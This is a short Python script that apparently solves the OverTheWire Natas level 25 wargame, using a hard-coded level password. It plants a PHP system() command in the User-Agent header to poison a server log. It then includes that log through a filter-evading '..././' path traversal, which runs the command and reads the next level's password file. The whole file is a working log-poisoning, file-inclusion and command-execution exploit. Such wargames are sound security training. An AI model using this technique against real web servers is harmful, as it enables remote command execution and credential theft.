#!/usr/bin/env python3
import requests

url = 'http://natas25.natas.labs.overthewire.org/'
s = requests.Session()
s.auth = ("natas25", "GHF6X7YwACaYYssHVY05cFq83hRktl4c")
headers = {'User-Agent': '<?php system(\'cat /etc/natas_webpass/natas26\') ?>'}
r = s.get(url, params={'lang': '../qsdf'}, headers=headers)
r = s.get(url, params={'lang': '..././..././..././..././..././var/www/natas/natas25/logs/natas25_'+s.cookies['PHPSESSID']+'.log'})
print(r.text)
